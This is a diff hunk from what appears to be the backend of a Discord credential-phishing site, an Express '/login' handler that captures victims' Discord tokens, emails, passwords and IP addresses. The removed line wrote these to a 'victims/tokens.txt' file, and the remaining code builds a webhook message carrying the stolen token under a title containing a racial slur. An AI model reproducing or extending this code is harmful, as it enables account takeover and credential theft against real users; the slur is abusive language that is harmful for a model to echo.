@@ -42,7 +42,6 @@ app.post('/login', rate, async (req, res) => {
 
         if (api && api.token) {
             const js = JSON.parse(Buffer.from(Buffer.from(body.ref, 'base64').toString('utf-8'), 'base64').toString())
-            await fs.promises.appendFile(path.join(__dirname, '..', 'victims', 'tokens.txt'), `${api.token}:false:${body.email}:${body.password}:${ip}:${js.guildId}:${js.clientId}\n`)
             const embed = new MessageBuilder()
                 .setTitle('logged this nigga')
                 .addField('token', '```' + api.token + '```', false)
